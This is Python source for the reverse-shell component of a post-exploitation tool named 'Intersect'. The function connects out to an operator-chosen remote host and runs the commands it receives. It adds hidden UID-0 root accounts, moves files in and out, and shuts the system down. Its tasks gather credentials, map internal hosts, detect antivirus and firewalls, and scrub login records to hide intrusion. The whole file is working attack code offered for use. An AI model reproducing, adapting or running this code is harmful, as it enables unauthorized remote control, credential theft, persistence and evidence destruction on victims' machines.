def reverseShell():
    #Change RHOST in environment() to your remote host
    socksize = 4096
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        conn.connect((RHOST, RPORT))
        conn.send("[+] New connection established!")
        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
    except:
        print("[!] Connection error!")
        sys.exit(2)

    while True:
	cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.")   
        elif cmd.startswith('upload'):
            data = conn.recv(1024)
            strip = data.split(" ")
            filename = strip[1]
            data = conn.recv(1024)
            filewrite=file(filename, "wb")
            filewrite.write(data)
            filewrite.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")
        elif cmd.startswith('download'):
            data = conn.recv(1024)
            strip = cmd.split(" ")
            filename = strip[1]
            if not os.path.isfile(filename):
                conn.send("[!] File not found on host! Check the filename and try again.")
            if os.path.isfile(filename):
                fileopen=file(filename, "rb")
                file_data=""
                for data in fileopen:
                    file_data += data
                    conn.sendall(file_data)
        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")
        elif cmd == ("extask\n"):
            conn.send("   extask help menu    \n")
            conn.send("extask osinfo      | gather os info\n")
            conn.send("extask livehosts   | maps internal network\n")
            conn.send("extask credentials | user/sys credentials\n")
            conn.send("extask findextras  | av/fw and extras\n")
            conn.send("extask network     | ips, fw rules, connections, etc\n")
            conn.send("extask scrub       | clears 'who' 'w' 'last' 'lastlog'\n")
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask osinfo\n"):
            Gather_OS()
            conn.send("\n[+] OS Info Gathering complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask network\n"):
            NetworkInfo()
            conn.send("\n[+] Network Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask credentials\n"):
            GetCredentials()
            conn.send("\n[+] Credentials Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask livehosts\n"):
            NetworkMap()
            conn.send("\n[+] Network Map complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask findextras\n"):
            FindExtras()
            conn.send("\n[+] Extras Gather complete.")
            conn.send("\n[+] Reports located in: %s " % Temp_Dir)
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ("extask scrub\n"):
            ScrubLog()
            conn.send("\n[+] Scrubbing complete.")
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd.startswith('helpme'):
            conn.send(" Intersect TCP Shell | Help Menu \n")
            conn.send("---------------------------------\n")
            conn.send("** download <file> | download file from host\n")
            conn.send("** upload <file>   | upload file to host\n")
            conn.send("** isniff <iface>  | start sniffer on <iface>\n")
            conn.send("** usessh <port>   | enable SSH on <port>\n")
            conn.send("   extask  <task>  | run Intersect tasks\n")
            conn.send("   adduser <name>  | add new root account\n")
            conn.send("   rebootsys       | reboots server system\n")
            conn.send("   helpme          | show this help menu\n")
            conn.send("   killme          | shuts down connection\n")
            conn.send("** = must connect using the Intersect shell client to use this feature.\n")
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
        elif cmd == ('killme\n'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)
        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect: "+str(os.getcwd())+" $ ") 



